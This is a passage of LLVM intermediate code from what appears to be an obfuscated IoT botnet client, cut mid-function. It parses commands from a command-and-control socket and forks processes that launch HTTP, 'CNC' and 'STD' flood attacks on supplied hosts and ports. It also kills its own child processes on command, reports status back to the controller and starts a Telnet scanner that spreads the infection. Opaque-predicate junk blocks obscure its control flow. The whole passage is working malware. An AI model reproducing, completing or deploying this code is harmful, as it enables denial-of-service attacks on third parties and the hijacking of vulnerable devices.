  %1394 = load i8*, i8** %1393, align 8
  %1395 = call i32 @atoi(i8* %1394) #10
  %1396 = trunc i32 %1395 to i16
  %1397 = load i8**, i8*** %4, align 8
  %1398 = getelementptr inbounds i8*, i8** %1397, i64 4
  %1399 = load i8*, i8** %1398, align 8
  %1400 = load i8**, i8*** %4, align 8
  %1401 = getelementptr inbounds i8*, i8** %1400, i64 5
  %1402 = load i8*, i8** %1401, align 8
  %1403 = call i32 @atoi(i8* %1402) #10
  %1404 = load i8**, i8*** %4, align 8
  %1405 = getelementptr inbounds i8*, i8** %1404, i64 6
  %1406 = load i8*, i8** %1405, align 8
  %1407 = call i32 @atoi(i8* %1406) #10
  call void @sendHTTP(i8* %1388, i8* %1391, i16 zeroext %1396, i8* %1399, i32 %1403, i32 %1407)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1408:                                   ; preds = %1380
  br label %1409

; <label>:1409:                                   ; preds = %1408, %originalBBpart2156
  %1410 = load i8**, i8*** %4, align 8
  %1411 = getelementptr inbounds i8*, i8** %1410, i64 0
  %1412 = load i8*, i8** %1411, align 8
  %1413 = call i32 @strcmp(i8* %1412, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.532, i32 0, i32 0)) #10
  %1414 = icmp ne i32 %1413, 0
  br i1 %1414, label %1569, label %1415

; <label>:1415:                                   ; preds = %1409
  %1416 = load i32, i32* @x.103
  %1417 = load i32, i32* @y.104
  %1418 = sub i32 %1416, 1
  %1419 = mul i32 %1416, %1418
  %1420 = urem i32 %1419, 2
  %1421 = icmp eq i32 %1420, 0
  %1422 = icmp slt i32 %1417, 10
  %1423 = or i1 %1421, %1422
  br i1 %1423, label %originalBB166, label %originalBB166alteredBB

originalBB166:                                    ; preds = %originalBB166alteredBB, %1415
  %1424 = load i32, i32* %3, align 4
  %1425 = icmp slt i32 %1424, 4
  %1426 = load i32, i32* @x.103
  %1427 = load i32, i32* @y.104
  %1428 = sub i32 %1426, 1
  %1429 = mul i32 %1426, %1428
  %1430 = urem i32 %1429, 2
  %1431 = icmp eq i32 %1430, 0
  %1432 = icmp slt i32 %1427, 10
  %1433 = or i1 %1431, %1432
  br i1 %1433, label %originalBBpart2168, label %originalBB166alteredBB

originalBBpart2168:                               ; preds = %originalBB166
  br i1 %1425, label %1462, label %1434

; <label>:1434:                                   ; preds = %originalBBpart2168
  %1435 = load i32, i32* @x.103
  %1436 = load i32, i32* @y.104
  %1437 = sub i32 %1435, 1
  %1438 = mul i32 %1435, %1437
  %1439 = urem i32 %1438, 2
  %1440 = icmp eq i32 %1439, 0
  %1441 = icmp slt i32 %1436, 10
  %1442 = or i1 %1440, %1441
  br i1 %1442, label %originalBB170, label %originalBB170alteredBB

originalBB170:                                    ; preds = %originalBB170alteredBB, %1434
  %1443 = load i8**, i8*** %4, align 8
  %1444 = getelementptr inbounds i8*, i8** %1443, i64 2
  %1445 = load i8*, i8** %1444, align 8
  %1446 = call i32 @atoi(i8* %1445) #10
  %1447 = icmp slt i32 %1446, 1
  %1448 = load i32, i32* @x.103
  %1449 = load i32, i32* @y.104
  %1450 = sub i32 %1448, 1
  %1451 = mul i32 %1448, %1450
  %1452 = urem i32 %1451, 2
  %1453 = icmp eq i32 %1452, 0
  %1454 = icmp slt i32 %1449, 10
  %1455 = or i1 %1453, %1454
  br i1 %1455, label %originalBBpart2172, label %originalBB170alteredBB

originalBBpart2172:                               ; preds = %originalBB170
  br i1 %1447, label %1462, label %1456

; <label>:1456:                                   ; preds = %originalBBpart2172
  %1457 = load i8**, i8*** %4, align 8
  %1458 = getelementptr inbounds i8*, i8** %1457, i64 3
  %1459 = load i8*, i8** %1458, align 8
  %1460 = call i32 @atoi(i8* %1459) #10
  %1461 = icmp slt i32 %1460, 1
  br i1 %1461, label %1462, label %1463

; <label>:1462:                                   ; preds = %1456, %originalBBpart2172, %originalBBpart2168
  br label %1829

; <label>:1463:                                   ; preds = %1456
  %1464 = load i8**, i8*** %4, align 8
  %1465 = getelementptr inbounds i8*, i8** %1464, i64 1
  %1466 = load i8*, i8** %1465, align 8
  store i8* %1466, i8** %47, align 8
  %1467 = load i8**, i8*** %4, align 8
  %1468 = getelementptr inbounds i8*, i8** %1467, i64 2
  %1469 = load i8*, i8** %1468, align 8
  %1470 = call i32 @atoi(i8* %1469) #10
  store i32 %1470, i32* %48, align 4
  %1471 = load i8**, i8*** %4, align 8
  %1472 = getelementptr inbounds i8*, i8** %1471, i64 3
  %1473 = load i8*, i8** %1472, align 8
  %1474 = call i32 @atoi(i8* %1473) #10
  store i32 %1474, i32* %49, align 4
  %1475 = load i8*, i8** %47, align 8
  %1476 = call i8* @strstr(i8* %1475, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #10
  %1477 = icmp ne i8* %1476, null
  br i1 %1477, label %1478, label %1528

; <label>:1478:                                   ; preds = %1463
  %1479 = load i8*, i8** %47, align 8
  %1480 = call i8* @strtok(i8* %1479, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %1480, i8** %50, align 8
  br label %1481

; <label>:1481:                                   ; preds = %1525, %1478
  %1482 = load i8*, i8** %50, align 8
  %1483 = icmp ne i8* %1482, null
  br i1 %1483, label %1484, label %1527

; <label>:1484:                                   ; preds = %1481
  %1485 = load i32, i32* @x.103
  %1486 = load i32, i32* @y.104
  %1487 = sub i32 %1485, 1
  %1488 = mul i32 %1485, %1487
  %1489 = urem i32 %1488, 2
  %1490 = icmp eq i32 %1489, 0
  %1491 = icmp slt i32 %1486, 10
  %1492 = or i1 %1490, %1491
  br i1 %1492, label %originalBB174, label %originalBB174alteredBB

originalBB174:                                    ; preds = %originalBB174alteredBB, %1484
  %1493 = call i32 @listFork()
  %1494 = icmp ne i32 %1493, 0
  %1495 = load i32, i32* @x.103
  %1496 = load i32, i32* @y.104
  %1497 = sub i32 %1495, 1
  %1498 = mul i32 %1495, %1497
  %1499 = urem i32 %1498, 2
  %1500 = icmp eq i32 %1499, 0
  %1501 = icmp slt i32 %1496, 10
  %1502 = or i1 %1500, %1501
  br i1 %1502, label %originalBBpart2176, label %originalBB174alteredBB

originalBBpart2176:                               ; preds = %originalBB174
  br i1 %1494, label %1525, label %1503

; <label>:1503:                                   ; preds = %originalBBpart2176
  %1504 = load i32, i32* @x.103
  %1505 = load i32, i32* @y.104
  %1506 = sub i32 %1504, 1
  %1507 = mul i32 %1504, %1506
  %1508 = urem i32 %1507, 2
  %1509 = icmp eq i32 %1508, 0
  %1510 = icmp slt i32 %1505, 10
  %1511 = or i1 %1509, %1510
  br i1 %1511, label %originalBB178, label %originalBB178alteredBB

originalBB178:                                    ; preds = %originalBB178alteredBB, %1503
  %1512 = load i8*, i8** %50, align 8
  %1513 = load i32, i32* %48, align 4
  %1514 = load i32, i32* %49, align 4
  call void @sendCNC(i8* %1512, i32 %1513, i32 %1514)
  %1515 = load i32, i32* @mainCommSock, align 4
  %1516 = call i32 @close(i32 %1515)
  call void @_exit(i32 0) #12
  %1517 = load i32, i32* @x.103
  %1518 = load i32, i32* @y.104
  %1519 = sub i32 %1517, 1
  %1520 = mul i32 %1517, %1519
  %1521 = urem i32 %1520, 2
  %1522 = icmp eq i32 %1521, 0
  %1523 = icmp slt i32 %1518, 10
  %1524 = or i1 %1522, %1523
  br i1 %1524, label %originalBBpart2180, label %originalBB178alteredBB

originalBBpart2180:                               ; preds = %originalBB178
  unreachable

; <label>:1525:                                   ; preds = %originalBBpart2176
  %1526 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %1526, i8** %50, align 8
  br label %1481

; <label>:1527:                                   ; preds = %1481
  br label %1568

; <label>:1528:                                   ; preds = %1463
  %1529 = load i32, i32* @x.103
  %1530 = load i32, i32* @y.104
  %1531 = sub i32 %1529, 1
  %1532 = mul i32 %1529, %1531
  %1533 = urem i32 %1532, 2
  %1534 = icmp eq i32 %1533, 0
  %1535 = icmp slt i32 %1530, 10
  %1536 = or i1 %1534, %1535
  br i1 %1536, label %originalBB182, label %originalBB182alteredBB

originalBB182:                                    ; preds = %originalBB182alteredBB, %1528
  %1537 = call i32 @listFork()
  %1538 = icmp ne i32 %1537, 0
  %1539 = load i32, i32* @x.103
  %1540 = load i32, i32* @y.104
  %1541 = sub i32 %1539, 1
  %1542 = mul i32 %1539, %1541
  %1543 = urem i32 %1542, 2
  %1544 = icmp eq i32 %1543, 0
  %1545 = icmp slt i32 %1540, 10
  %1546 = or i1 %1544, %1545
  br i1 %1546, label %originalBBpart2184, label %originalBB182alteredBB

originalBBpart2184:                               ; preds = %originalBB182
  br i1 %1538, label %1547, label %1548

; <label>:1547:                                   ; preds = %originalBBpart2184
  br label %1829

; <label>:1548:                                   ; preds = %originalBBpart2184
  %1549 = load i32, i32* @x.103
  %1550 = load i32, i32* @y.104
  %1551 = sub i32 %1549, 1
  %1552 = mul i32 %1549, %1551
  %1553 = urem i32 %1552, 2
  %1554 = icmp eq i32 %1553, 0
  %1555 = icmp slt i32 %1550, 10
  %1556 = or i1 %1554, %1555
  br i1 %1556, label %originalBB186, label %originalBB186alteredBB

originalBB186:                                    ; preds = %originalBB186alteredBB, %1548
  %1557 = load i8*, i8** %47, align 8
  %1558 = load i32, i32* %48, align 4
  %1559 = load i32, i32* %49, align 4
  call void @sendCNC(i8* %1557, i32 %1558, i32 %1559)
  call void @_exit(i32 0) #12
  %1560 = load i32, i32* @x.103
  %1561 = load i32, i32* @y.104
  %1562 = sub i32 %1560, 1
  %1563 = mul i32 %1560, %1562
  %1564 = urem i32 %1563, 2
  %1565 = icmp eq i32 %1564, 0
  %1566 = icmp slt i32 %1561, 10
  %1567 = or i1 %1565, %1566
  br i1 %1567, label %originalBBpart2188, label %originalBB186alteredBB

originalBBpart2188:                               ; preds = %originalBB186
  unreachable

; <label>:1568:                                   ; preds = %1527
  br label %1569

; <label>:1569:                                   ; preds = %1568, %1409
  %1570 = load i8**, i8*** %4, align 8
  %1571 = getelementptr inbounds i8*, i8** %1570, i64 0
  %1572 = load i8*, i8** %1571, align 8
  %1573 = call i32 @strcmp(i8* %1572, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.533, i32 0, i32 0)) #10
  %1574 = icmp ne i32 %1573, 0
  br i1 %1574, label %1695, label %1575

; <label>:1575:                                   ; preds = %1569
  %1576 = load i32, i32* %3, align 4
  %1577 = icmp slt i32 %1576, 4
  br i1 %1577, label %1606, label %1578

; <label>:1578:                                   ; preds = %1575
  %1579 = load i32, i32* @x.103
  %1580 = load i32, i32* @y.104
  %1581 = sub i32 %1579, 1
  %1582 = mul i32 %1579, %1581
  %1583 = urem i32 %1582, 2
  %1584 = icmp eq i32 %1583, 0
  %1585 = icmp slt i32 %1580, 10
  %1586 = or i1 %1584, %1585
  br i1 %1586, label %originalBB190, label %originalBB190alteredBB

originalBB190:                                    ; preds = %originalBB190alteredBB, %1578
  %1587 = load i8**, i8*** %4, align 8
  %1588 = getelementptr inbounds i8*, i8** %1587, i64 2
  %1589 = load i8*, i8** %1588, align 8
  %1590 = call i32 @atoi(i8* %1589) #10
  %1591 = icmp slt i32 %1590, 1
  %1592 = load i32, i32* @x.103
  %1593 = load i32, i32* @y.104
  %1594 = sub i32 %1592, 1
  %1595 = mul i32 %1592, %1594
  %1596 = urem i32 %1595, 2
  %1597 = icmp eq i32 %1596, 0
  %1598 = icmp slt i32 %1593, 10
  %1599 = or i1 %1597, %1598
  br i1 %1599, label %originalBBpart2192, label %originalBB190alteredBB

originalBBpart2192:                               ; preds = %originalBB190
  br i1 %1591, label %1606, label %1600

; <label>:1600:                                   ; preds = %originalBBpart2192
  %1601 = load i8**, i8*** %4, align 8
  %1602 = getelementptr inbounds i8*, i8** %1601, i64 3
  %1603 = load i8*, i8** %1602, align 8
  %1604 = call i32 @atoi(i8* %1603) #10
  %1605 = icmp slt i32 %1604, 1
  br i1 %1605, label %1606, label %1607

; <label>:1606:                                   ; preds = %1600, %originalBBpart2192, %1575
  br label %1829

; <label>:1607:                                   ; preds = %1600
  %1608 = load i32, i32* @x.103
  %1609 = load i32, i32* @y.104
  %1610 = sub i32 %1608, 1
  %1611 = mul i32 %1608, %1610
  %1612 = urem i32 %1611, 2
  %1613 = icmp eq i32 %1612, 0
  %1614 = icmp slt i32 %1609, 10
  %1615 = or i1 %1613, %1614
  br i1 %1615, label %originalBB194, label %originalBB194alteredBB

originalBB194:                                    ; preds = %originalBB194alteredBB, %1607
  %1616 = load i8**, i8*** %4, align 8
  %1617 = getelementptr inbounds i8*, i8** %1616, i64 1
  %1618 = load i8*, i8** %1617, align 8
  store i8* %1618, i8** %51, align 8
  %1619 = load i8**, i8*** %4, align 8
  %1620 = getelementptr inbounds i8*, i8** %1619, i64 2
  %1621 = load i8*, i8** %1620, align 8
  %1622 = call i32 @atoi(i8* %1621) #10
  store i32 %1622, i32* %52, align 4
  %1623 = load i8**, i8*** %4, align 8
  %1624 = getelementptr inbounds i8*, i8** %1623, i64 3
  %1625 = load i8*, i8** %1624, align 8
  %1626 = call i32 @atoi(i8* %1625) #10
  store i32 %1626, i32* %53, align 4
  %1627 = load i8*, i8** %51, align 8
  %1628 = call i8* @strstr(i8* %1627, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #10
  %1629 = icmp ne i8* %1628, null
  %1630 = load i32, i32* @x.103
  %1631 = load i32, i32* @y.104
  %1632 = sub i32 %1630, 1
  %1633 = mul i32 %1630, %1632
  %1634 = urem i32 %1633, 2
  %1635 = icmp eq i32 %1634, 0
  %1636 = icmp slt i32 %1631, 10
  %1637 = or i1 %1635, %1636
  br i1 %1637, label %originalBBpart2196, label %originalBB194alteredBB

originalBBpart2196:                               ; preds = %originalBB194
  br i1 %1629, label %1638, label %1654

; <label>:1638:                                   ; preds = %originalBBpart2196
  %1639 = load i8*, i8** %51, align 8
  %1640 = call i8* @strtok(i8* %1639, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %1640, i8** %54, align 8
  br label %1641

; <label>:1641:                                   ; preds = %1651, %1638
  %1642 = load i8*, i8** %54, align 8
  %1643 = icmp ne i8* %1642, null
  br i1 %1643, label %1644, label %1653

; <label>:1644:                                   ; preds = %1641
  %1645 = call i32 @listFork()
  %1646 = icmp ne i32 %1645, 0
  br i1 %1646, label %1651, label %1647

; <label>:1647:                                   ; preds = %1644
  %1648 = load i8*, i8** %54, align 8
  %1649 = load i32, i32* %52, align 4
  %1650 = load i32, i32* %53, align 4
  call void @sendSTD(i8* %1648, i32 %1649, i32 %1650)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1651:                                   ; preds = %1644
  %1652 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %1652, i8** %54, align 8
  br label %1641

; <label>:1653:                                   ; preds = %1641
  br label %1694

; <label>:1654:                                   ; preds = %originalBBpart2196
  %1655 = load i32, i32* @x.103
  %1656 = load i32, i32* @y.104
  %1657 = sub i32 %1655, 1
  %1658 = mul i32 %1655, %1657
  %1659 = urem i32 %1658, 2
  %1660 = icmp eq i32 %1659, 0
  %1661 = icmp slt i32 %1656, 10
  %1662 = or i1 %1660, %1661
  br i1 %1662, label %originalBB198, label %originalBB198alteredBB

originalBB198:                                    ; preds = %originalBB198alteredBB, %1654
  %1663 = call i32 @listFork()
  %1664 = icmp ne i32 %1663, 0
  %1665 = load i32, i32* @x.103
  %1666 = load i32, i32* @y.104
  %1667 = sub i32 %1665, 1
  %1668 = mul i32 %1665, %1667
  %1669 = urem i32 %1668, 2
  %1670 = icmp eq i32 %1669, 0
  %1671 = icmp slt i32 %1666, 10
  %1672 = or i1 %1670, %1671
  br i1 %1672, label %originalBBpart2200, label %originalBB198alteredBB

originalBBpart2200:                               ; preds = %originalBB198
  br i1 %1664, label %1673, label %1674

; <label>:1673:                                   ; preds = %originalBBpart2200
  br label %1829

; <label>:1674:                                   ; preds = %originalBBpart2200
  %1675 = load i32, i32* @x.103
  %1676 = load i32, i32* @y.104
  %1677 = sub i32 %1675, 1
  %1678 = mul i32 %1675, %1677
  %1679 = urem i32 %1678, 2
  %1680 = icmp eq i32 %1679, 0
  %1681 = icmp slt i32 %1676, 10
  %1682 = or i1 %1680, %1681
  br i1 %1682, label %originalBB202, label %originalBB202alteredBB

originalBB202:                                    ; preds = %originalBB202alteredBB, %1674
  %1683 = load i8*, i8** %51, align 8
  %1684 = load i32, i32* %52, align 4
  %1685 = load i32, i32* %53, align 4
  call void @sendSTD(i8* %1683, i32 %1684, i32 %1685)
  call void @_exit(i32 0) #12
  %1686 = load i32, i32* @x.103
  %1687 = load i32, i32* @y.104
  %1688 = sub i32 %1686, 1
  %1689 = mul i32 %1686, %1688
  %1690 = urem i32 %1689, 2
  %1691 = icmp eq i32 %1690, 0
  %1692 = icmp slt i32 %1687, 10
  %1693 = or i1 %1691, %1692
  br i1 %1693, label %originalBBpart2204, label %originalBB202alteredBB

originalBBpart2204:                               ; preds = %originalBB202
  unreachable

; <label>:1694:                                   ; preds = %1653
  br label %1695

; <label>:1695:                                   ; preds = %1694, %1569
  %1696 = load i32, i32* @x.103
  %1697 = load i32, i32* @y.104
  %1698 = sub i32 %1696, 1
  %1699 = mul i32 %1696, %1698
  %1700 = urem i32 %1699, 2
  %1701 = icmp eq i32 %1700, 0
  %1702 = icmp slt i32 %1697, 10
  %1703 = or i1 %1701, %1702
  br i1 %1703, label %originalBB206, label %originalBB206alteredBB

originalBB206:                                    ; preds = %originalBB206alteredBB, %1695
  %1704 = load i8**, i8*** %4, align 8
  %1705 = getelementptr inbounds i8*, i8** %1704, i64 0
  %1706 = load i8*, i8** %1705, align 8
  %1707 = call i32 @strcmp(i8* %1706, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.534, i32 0, i32 0)) #10
  %1708 = icmp ne i32 %1707, 0
  %1709 = load i32, i32* @x.103
  %1710 = load i32, i32* @y.104
  %1711 = sub i32 %1709, 1
  %1712 = mul i32 %1709, %1711
  %1713 = urem i32 %1712, 2
  %1714 = icmp eq i32 %1713, 0
  %1715 = icmp slt i32 %1710, 10
  %1716 = or i1 %1714, %1715
  br i1 %1716, label %originalBBpart2208, label %originalBB206alteredBB

originalBBpart2208:                               ; preds = %originalBB206
  br i1 %1708, label %1806, label %1717

; <label>:1717:                                   ; preds = %originalBBpart2208
  store i32 0, i32* %55, align 4
  store i64 0, i64* %56, align 8
  br label %1718

; <label>:1718:                                   ; preds = %1776, %1717
  %1719 = load i32, i32* @x.103
  %1720 = load i32, i32* @y.104
  %1721 = sub i32 %1719, 1
  %1722 = mul i32 %1719, %1721
  %1723 = urem i32 %1722, 2
  %1724 = icmp eq i32 %1723, 0
  %1725 = icmp slt i32 %1720, 10
  %1726 = or i1 %1724, %1725
  br i1 %1726, label %originalBB210, label %originalBB210alteredBB

originalBB210:                                    ; preds = %originalBB210alteredBB, %1718
  %1727 = load i64, i64* %56, align 8
  %1728 = load i64, i64* @numpids, align 8
  %1729 = icmp ult i64 %1727, %1728
  %1730 = load i32, i32* @x.103
  %1731 = load i32, i32* @y.104
  %1732 = sub i32 %1730, 1
  %1733 = mul i32 %1730, %1732
  %1734 = urem i32 %1733, 2
  %1735 = icmp eq i32 %1734, 0
  %1736 = icmp slt i32 %1731, 10
  %1737 = or i1 %1735, %1736
  br i1 %1737, label %originalBBpart2212, label %originalBB210alteredBB

originalBBpart2212:                               ; preds = %originalBB210
  br i1 %1729, label %1738, label %1779

; <label>:1738:                                   ; preds = %originalBBpart2212
  %1739 = load i32*, i32** @pids, align 8
  %1740 = load i64, i64* %56, align 8
  %1741 = getelementptr inbounds i32, i32* %1739, i64 %1740
  %1742 = load i32, i32* %1741, align 4
  %1743 = icmp ne i32 %1742, 0
  br i1 %1743, label %1744, label %1759

; <label>:1744:                                   ; preds = %1738
  %1745 = load i32*, i32** @pids, align 8
  %1746 = load i64, i64* %56, align 8
  %1747 = getelementptr inbounds i32, i32* %1745, i64 %1746
  %1748 = load i32, i32* %1747, align 4
  %1749 = call i32 @getpid() #2
  %1750 = icmp ne i32 %1748, %1749
  br i1 %1750, label %1751, label %1759

; <label>:1751:                                   ; preds = %1744
  %1752 = load i32*, i32** @pids, align 8
  %1753 = load i64, i64* %56, align 8
  %1754 = getelementptr inbounds i32, i32* %1752, i64 %1753
  %1755 = load i32, i32* %1754, align 4
  %1756 = call i32 @kill(i32 %1755, i32 9) #2
  %1757 = load i32, i32* %55, align 4
  %1758 = add nsw i32 %1757, 1
  store i32 %1758, i32* %55, align 4
  br label %1759

; <label>:1759:                                   ; preds = %1751, %1744, %1738
  %1760 = load i32, i32* @x.103
  %1761 = load i32, i32* @y.104
  %1762 = sub i32 %1760, 1
  %1763 = mul i32 %1760, %1762
  %1764 = urem i32 %1763, 2
  %1765 = icmp eq i32 %1764, 0
  %1766 = icmp slt i32 %1761, 10
  %1767 = or i1 %1765, %1766
  br i1 %1767, label %originalBB214, label %originalBB214alteredBB

originalBB214:                                    ; preds = %originalBB214alteredBB, %1759
  %1768 = load i32, i32* @x.103
  %1769 = load i32, i32* @y.104
  %1770 = sub i32 %1768, 1
  %1771 = mul i32 %1768, %1770
  %1772 = urem i32 %1771, 2
  %1773 = icmp eq i32 %1772, 0
  %1774 = icmp slt i32 %1769, 10
  %1775 = or i1 %1773, %1774
  br i1 %1775, label %originalBBpart2216, label %originalBB214alteredBB

originalBBpart2216:                               ; preds = %originalBB214
  br label %1776

; <label>:1776:                                   ; preds = %originalBBpart2216
  %1777 = load i64, i64* %56, align 8
  %1778 = add i64 %1777, 1
  store i64 %1778, i64* %56, align 8
  br label %1718

; <label>:1779:                                   ; preds = %originalBBpart2212
  %1780 = load i32, i32* %55, align 4
  %1781 = icmp sgt i32 %1780, 0
  br i1 %1781, label %1782, label %1786

; <label>:1782:                                   ; preds = %1779
  %1783 = load i32, i32* @mainCommSock, align 4
  %1784 = load i32, i32* %55, align 4
  %1785 = call i32 (i32, i8*, ...) @sockprintf(i32 %1783, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.535, i32 0, i32 0), i32 %1784)
  br label %1805

; <label>:1786:                                   ; preds = %1779
  %1787 = load i32, i32* @x.103
  %1788 = load i32, i32* @y.104
  %1789 = sub i32 %1787, 1
  %1790 = mul i32 %1787, %1789
  %1791 = urem i32 %1790, 2
  %1792 = icmp eq i32 %1791, 0
  %1793 = icmp slt i32 %1788, 10
  %1794 = or i1 %1792, %1793
  br i1 %1794, label %originalBB218, label %originalBB218alteredBB

originalBB218:                                    ; preds = %originalBB218alteredBB, %1786
  %1795 = load i32, i32* @mainCommSock, align 4
  %1796 = call i32 (i32, i8*, ...) @sockprintf(i32 %1795, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.536, i32 0, i32 0))
  %1797 = load i32, i32* @x.103
  %1798 = load i32, i32* @y.104
  %1799 = sub i32 %1797, 1
  %1800 = mul i32 %1797, %1799
  %1801 = urem i32 %1800, 2
  %1802 = icmp eq i32 %1801, 0
  %1803 = icmp slt i32 %1798, 10
  %1804 = or i1 %1802, %1803
  br i1 %1804, label %originalBBpart2220, label %originalBB218alteredBB

originalBBpart2220:                               ; preds = %originalBB218
  br label %1805

; <label>:1805:                                   ; preds = %originalBBpart2220, %1782
  br label %1806

; <label>:1806:                                   ; preds = %1805, %originalBBpart2208
  %1807 = load i8**, i8*** %4, align 8
  %1808 = getelementptr inbounds i8*, i8** %1807, i64 0
  %1809 = load i8*, i8** %1808, align 8
  %1810 = call i32 @strcmp(i8* %1809, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.537, i32 0, i32 0)) #10
  %1811 = icmp ne i32 %1810, 0
  br i1 %1811, label %1829, label %1812

; <label>:1812:                                   ; preds = %1806
  %1813 = load i32, i32* @x.103
  %1814 = load i32, i32* @y.104
  %1815 = sub i32 %1813, 1
  %1816 = mul i32 %1813, %1815
  %1817 = urem i32 %1816, 2
  %1818 = icmp eq i32 %1817, 0
  %1819 = icmp slt i32 %1814, 10
  %1820 = or i1 %1818, %1819
  br i1 %1820, label %originalBB222, label %originalBB222alteredBB

originalBB222:                                    ; preds = %originalBB222alteredBB, %1812
  call void @exit(i32 0) #14
  %1821 = load i32, i32* @x.103
  %1822 = load i32, i32* @y.104
  %1823 = sub i32 %1821, 1
  %1824 = mul i32 %1821, %1823
  %1825 = urem i32 %1824, 2
  %1826 = icmp eq i32 %1825, 0
  %1827 = icmp slt i32 %1822, 10
  %1828 = or i1 %1826, %1827
  br i1 %1828, label %originalBBpart2224, label %originalBB222alteredBB

originalBBpart2224:                               ; preds = %originalBB222
  unreachable

; <label>:1829:                                   ; preds = %1806, %1673, %1606, %1547, %1462, %1384, %originalBBpart2160, %1076, %976, %824, %originalBBpart276, %612, %548, %500, %452, %420, %372, %340, %245, %originalBBpart228, %219, %originalBBpart216, %originalBBpart212, %originalBBpart28, %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %62
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %79
  %1830 = load i8**, i8*** %4, align 8
  %1831 = getelementptr inbounds i8*, i8** %1830, i64 0
  %1832 = load i8*, i8** %1831, align 8
  %1833 = call i32 @strcmp(i8* %1832, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.518, i32 0, i32 0)) #10
  %1834 = icmp ne i32 %1833, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %101
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %124
  call void (i32, ...) bitcast (void ()* @UpdateBins to void (i32, ...)*)(i32 1)
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %156
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %178
  %1835 = load i8**, i8*** %4, align 8
  %1836 = getelementptr inbounds i8*, i8** %1835, i64 1
  %1837 = load i8*, i8** %1836, align 8
  %1838 = call i32 @strcmp(i8* %1837, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.523, i32 0, i32 0)) #10
  %1839 = icmp ne i32 %1838, 0
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %200
  %1840 = load i32, i32* @scanPid, align 4
  %1841 = icmp ne i32 %1840, 0
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %224
  %1842 = load i32, i32* %5, align 4
  store i32 %1842, i32* @scanPid, align 4
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %246
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %263
  %1843 = load i32, i32* @mainCommSock, align 4
  %1844 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %1845 = call i8* @inet_ntoa(i32 %1844) #2
  %1846 = call i32 (i32, i8*, ...) @sockprintf(i32 %1843, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.524, i32 0, i32 0), i8* %1845)
  %1847 = load i32, i32* %7, align 4
  %1848 = load i32, i32* %6, align 4
  call void @TelnetScanner(i32 %1847, i32 %1848)
  call void @_exit(i32 0) #12
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %293
  %1849 = call i32 @listFork()
  %1850 = icmp ne i32 %1849, 0
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %317
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %347
  %1851 = load i8**, i8*** %4, align 8
  %1852 = getelementptr inbounds i8*, i8** %1851, i64 1
  %1853 = load i8*, i8** %1852, align 8
  %1854 = call i32 @strcmp(i8* %1853, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.504, i32 0, i32 0)) #10
  %1855 = icmp ne i32 %1854, 0
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %395
  %1856 = load i8**, i8*** %4, align 8
  %1857 = getelementptr inbounds i8*, i8** %1856, i64 1
  %1858 = load i8*, i8** %1857, align 8
  %1859 = call i32 @strcmp(i8* %1858, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.506, i32 0, i32 0)) #10
  %1860 = icmp ne i32 %1859, 0
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %481
  %1861 = load i32, i32* %3, align 4
  %1862 = icmp ne i32 %1861, 5
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %529
  %1863 = load i32, i32* %3, align 4
  %1864 = icmp ne i32 %1863, 5
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %571
  %1865 = load i8**, i8*** %4, align 8
  %1866 = getelementptr inbounds i8*, i8** %1865, i64 1
  %1867 = load i8*, i8** %1866, align 8
  %1868 = call i32 @strcmp(i8* %1867, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.512, i32 0, i32 0)) #10
  %1869 = icmp ne i32 %1868, 0
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %593
  %1870 = load i32, i32* %3, align 4
  %1871 = icmp ne i32 %1870, 5
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %641
  %1872 = load i32, i32* %3, align 4
  %1873 = icmp ne i32 %1872, 5
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %660
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %700
  %1874 = load i8**, i8*** %4, align 8
  %1875 = getelementptr inbounds i8*, i8** %1874, i64 0
  %1876 = load i8*, i8** %1875, align 8
